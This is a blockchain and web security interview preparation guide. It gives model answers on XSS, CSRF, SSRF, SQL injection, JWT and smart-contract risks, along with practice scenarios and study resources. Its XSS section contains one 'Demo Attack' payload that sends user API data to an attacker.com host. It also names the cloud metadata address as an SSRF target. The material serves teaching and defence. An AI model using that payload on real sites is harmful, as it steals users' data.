# Blockchain Security Interview Preparation Guide

## Overview
This guide covers the most critical security vulnerabilities you'll encounter in blockchain and web application security roles. Each section includes attack vectors, exploitation techniques, and prevention strategies.

## Interview Topics Covered

### 1. Cross-Site Scripting (XSS)
**Key Points:**
- **Reflected XSS**: User input directly reflected in response
- **Stored XSS**: Malicious script stored in database
- **DOM XSS**: Client-side script manipulation

**Common Questions:**
- "How would you prevent XSS in a React application?"
  *Answer: React has built-in protections that treat user input as text by default. I'd leverage these protections, avoid risky functions that bypass them, validate all user input, and add security policies that control what scripts can run on our site.*
- "What's the difference between `innerHTML` and `textContent`?"
  *Answer: Think of innerHTML as accepting formatted documents—it can execute hidden code. textContent only accepts plain text, like a simple notepad. For user input, we always want the safer plain text option.*
- "Explain Content Security Policy (CSP)"
  *Answer: CSP is like a security guard for your website. It defines which sources are allowed to provide content (scripts, images, etc.), blocking anything unauthorized. This prevents attackers from injecting malicious code even if they find a way in.*

**Demo Attack:**
```javascript
// Payload: <script>fetch('/api/user/data').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?data='+btoa(JSON.stringify(d))))</script>
```

### 2. Cross-Site Request Forgery (CSRF)
**Key Points:**
- State-changing operations without validation
- SameSite cookie attributes
- Double-submit cookie pattern

**Common Questions:**
- "How does CSRF differ from XSS?"
  *Answer: XSS is like an imposter getting inside your building and causing damage. CSRF is like tricking an authorized person into performing actions they didn't intend—someone uses your logged-in session against you from an external site.*
- "When is CSRF protection not needed?"
  *Answer: CSRF only matters for actions that change data (like transfers or deletions). Reading information, APIs with strong authentication tokens, and systems with strict cookie policies don't need additional CSRF protection.*
- "Explain the synchronizer token pattern"
  *Answer: It's like a handshake system—when you load a page, the server gives you a unique secret code. When you submit an action, you must return that exact code. Attackers can't get this code from external sites, so they can't forge requests.*

### 3. Server-Side Request Forgery (SSRF)
**Key Points:**
- Internal service enumeration
- Cloud metadata access (169.254.169.254)
- DNS rebinding attacks

**Common Questions:**
- "How would you prevent SSRF in a URL fetching service?"
  *Answer: I'd create an approved list of allowed destinations, block access to internal company resources, verify destinations are legitimate, and segment our network so even if attacked, damage is contained. It's about controlling where our servers can reach.*
- "What are the risks of SSRF in cloud environments?"
  *Answer: In cloud environments, servers have access to a special internal address that provides sensitive credentials and configuration. SSRF attacks can exploit this to steal cloud credentials, map internal infrastructure, and access systems that should be private.*
- "Explain DNS rebinding in the context of SSRF"
  *Answer: It's a bait-and-switch attack. An attacker controls a domain that initially points to a safe address. After our system checks and approves it, the attacker changes it to point at internal systems, bypassing our security checks.*

### 4. SQL Injection
**Key Points:**
- Union-based injection --> This is when an attacker tries to combine their malicious query with a legitimate one to extract data. You defend against it by validating all inputs and using parameterized queries.
- Blind SQL injection (boolean and time-based) --> This is when an attacker can't see the results of their query, but can infer information based on the server's response or lack thereof. You defend against it by validating all inputs and using parameterized queries.
- Second-order SQL injection --> This is when an attacker injects malicious code into a database, but it doesn't execute until a later, legitimate query is run. You defend against it by validating all inputs and using parameterized queries.

**Common Questions:**
- "How do prepared statements prevent SQL injection?"
  *Answer: Prepared statements separate the database command structure from user data. It's like filling out a pre-printed form instead of writing free text—the data goes in designated spots and can't change the underlying instructions, so malicious code can't execute.*
- "What's the difference between parameterized queries and stored procedures?"
  *Answer: Both are secure approaches. Parameterized queries are like fill-in-the-blank forms where data goes into specific slots. Stored procedures are pre-written, approved database scripts. Both prevent attackers from injecting malicious database commands.*
- "How would you detect SQL injection in logs?"
  *Answer: I'd watch for database command keywords appearing in user input, unusual patterns like accessing many tables at once, database error messages being triggered, and requests that take unusually long (attackers probing the system).*

### 5. Authentication & Authorization
**Key Points:**
- JWT vulnerabilities (algorithm confusion, weak secrets)
- Session management flaws
- Privilege escalation

**Common Questions:**
- "What are the security considerations for JWT?"
  *Answer: JWTs are digital tokens that prove identity. Key concerns: using strong secret keys (like strong passwords), validating the signing method, setting expiration times so stolen tokens don't work forever, storing them securely, and having a way to revoke compromised tokens.*
- "How would you implement secure password reset?"
  *Answer: Generate a random, unguessable reset link, make it expire quickly (15-30 minutes), limit how many requests someone can make, verify via email, and invalidate the link immediately after use. This prevents attackers from hijacking accounts.*
- "Explain the principle of least privilege"
  *Answer: Give users and systems only the minimum access they need to do their job—nothing more. If an account gets compromised, the attacker can only do what that account was allowed to do. It's damage control built into permissions.*

### 6. Input Validation
**Key Points:**
- Path traversal attacks
- Command injection
- XML External Entity (XXE)

**Common Questions:**
- "How would you safely handle file uploads?"
  *Answer: Verify file types (not just extensions), limit file sizes, scan for viruses, store uploads separately from application code, rename files to prevent conflicts, and check actual content matches the claimed type. Uploaded files are a major attack vector.*
- "What's the difference between blacklisting and whitelisting?"
  *Answer: Blacklisting tries to block known bad things—but attackers find new ways around it. Whitelisting only allows specific approved things—much more secure because everything else is blocked by default. It's opt-in vs. opt-out security.*
- "How do you prevent command injection in system calls?"
  *Answer: Use secure programming interfaces that don't allow command injection, validate all inputs strictly, avoid running system commands when possible, and run processes with minimal permissions. Never trust user input in system commands.*

### 7. Blockchain-Specific Security
**Key Points:**
- Private key management
- Smart contract vulnerabilities
- Oracle manipulation

**Common Questions:**
- "How would you securely store private keys?"
  *Answer: Use dedicated hardware security devices, encrypt keys when stored, generate keys from secure master seeds, require multiple signatures for transactions, and never store keys as plain text. Private keys are like nuclear launch codes—compromise means complete loss of funds.*
- "What are the risks of using a single price oracle?"
  *Answer: A single price source can be manipulated by attackers or fail completely. One attack method uses instant loans to manipulate prices temporarily. The solution is using multiple independent price sources and taking the median value—no single source can be trusted.*
- "Explain reentrancy attacks in smart contracts"
  *Answer: It's like someone interrupting you mid-transaction before you can update your records. The attacker calls your code, which calls their code, which calls your code again before the first transaction finishes—allowing them to drain funds. The fix is updating all records before calling external code.*

## Attack Scenarios for Practice

### Scenario 1: E-commerce Platform
**Vulnerabilities to find:**
- Stored XSS in product reviews
- IDOR in order management
- SQL injection in search functionality
- CSRF in payment processing

### Scenario 2: DeFi Protocol
**Vulnerabilities to find:**
- Oracle manipulation
- Flash loan attacks
- Reentrancy in token swaps
- Front-running vulnerabilities

### Scenario 3: Social Media App
**Vulnerabilities to find:**
- XSS in user profiles
- CSRF in friend requests
- SSRF in link previews
- Authentication bypass

## Red Flags to Identify

### Code Review Red Flags
1. Direct string concatenation in SQL queries
2. `innerHTML` usage with user input
3. `eval()` or `Function()` with user data
4. Missing CSRF tokens on state-changing operations
5. Hardcoded secrets or weak randomness
6. Missing input validation
7. Overprivileged database connections

### Architecture Red Flags
1. Single points of failure
2. Missing rate limiting
3. Inadequate logging and monitoring
4. Weak session management
5. Missing security headers
6. Unencrypted sensitive data storage

## Prevention Strategies

### Defense in Depth
1. **Input Validation**: Validate all inputs at boundaries
2. **Output Encoding**: Encode data based on context
3. **Authentication**: Multi-factor authentication
4. **Authorization**: Principle of least privilege
5. **Encryption**: Encrypt sensitive data at rest and in transit
6. **Monitoring**: Log security events and anomalies

### Secure Development Practices
1. **Security by Design**: Consider security from the start
2. **Code Reviews**: Regular security-focused reviews
3. **Static Analysis**: Automated vulnerability scanning
4. **Penetration Testing**: Regular security assessments
5. **Incident Response**: Prepared response procedures

## Interview Tips

### Technical Questions
- Always explain the attack vector first
- Discuss both prevention and detection
- Mention defense in depth principles
- Consider the business impact

### Behavioral Questions
- Describe past security incidents you've handled
- Explain how you stay updated on security trends
- Discuss collaboration with development teams
- Share examples of security improvements you've implemented

### Hands-on Exercises
- Be prepared to review code for vulnerabilities
- Practice explaining complex attacks simply
- Know how to use common security tools
- Understand both offensive and defensive perspectives

## Resources for Further Study

### Books
- "The Web Application Hacker's Handbook"
- "Mastering Ethereum" (for blockchain security)
- "Building Secure and Reliable Systems"

### Tools to Know
- Burp Suite / OWASP ZAP
- Static analysis tools (SonarQube, Checkmarx)
- Blockchain analysis tools (Mythril, Slither)

### Practice Platforms
- OWASP WebGoat
- Damn Vulnerable Web Application (DVWA)
- Ethernaut (for smart contract security)

## Common Interview Questions

### General Security
1. "Walk me through how you would secure a new web application"
   *Answer: First, identify potential threats and design with security in mind. Then implement core protections: validate all inputs, secure authentication and access controls, encrypt sensitive data, monitor for suspicious activity, and test thoroughly before launch. Security should be built in from the start, not added later.*
2. "How do you balance security with usability?"
   *Answer: Use a risk-based approach—stronger security for sensitive operations, lighter security for low-risk actions. Educate users on why security matters. Apply stronger measures (like two-factor authentication) only where needed. Good security design feels seamless to legitimate users.*
3. "Describe a time you found a critical vulnerability"
   *Answer: [Prepare specific example with impact, remediation, lessons learned]*

### Technical Deep Dives
1. "Explain how you would implement secure authentication"
   *Answer: Start with multi-factor authentication so passwords alone aren't enough. Enforce strong password requirements, manage user sessions securely, lock accounts after failed attempts, and log all authentication events for audit trails. Each layer adds protection against different attack methods.*
2. "How would you design a secure API?"
   *Answer: Use industry-standard authentication tokens, limit how many requests can be made to prevent abuse, validate all incoming data, require encrypted connections, track versions for controlled updates, monitor for anomalies, and give each API client only the permissions they need.*
3. "What are the security considerations for microservices?"
   *Answer: Secure communication between services, verify each service's identity, isolate services on the network so breaches don't spread, manage secrets centrally rather than hardcoding them, and aggregate logs from all services to detect coordinated attacks. Distributed systems have more attack surface.*

### Blockchain Specific
1. "How would you secure a cryptocurrency wallet?"
   *Answer: Use physical hardware devices for key storage, require multiple signatures for transactions, generate keys from secure seed phrases with good backups, validate every transaction before signing, and add two-factor authentication. Blockchain transactions are irreversible, so security is critical.*
2. "What are the main attack vectors against DeFi protocols?"
   *Answer: Instant massive loans to manipulate markets, price data manipulation, calling code recursively to drain funds, front-running transactions for profit, exploiting voting mechanisms, and attacking bridges between blockchains. DeFi's transparency helps attackers identify targets.*
3. "How do you validate smart contract security?"
   *Answer: Use automated security scanners, mathematically verify critical logic, hire professional auditors, test with random/unexpected inputs, achieve comprehensive test coverage, and offer rewards for finding bugs. Smart contracts can't be patched after deployment, so pre-launch security is essential.*

Remember: Focus on understanding the underlying principles rather than memorizing specific exploits. Good security professionals can adapt their knowledge to new technologies and attack vectors.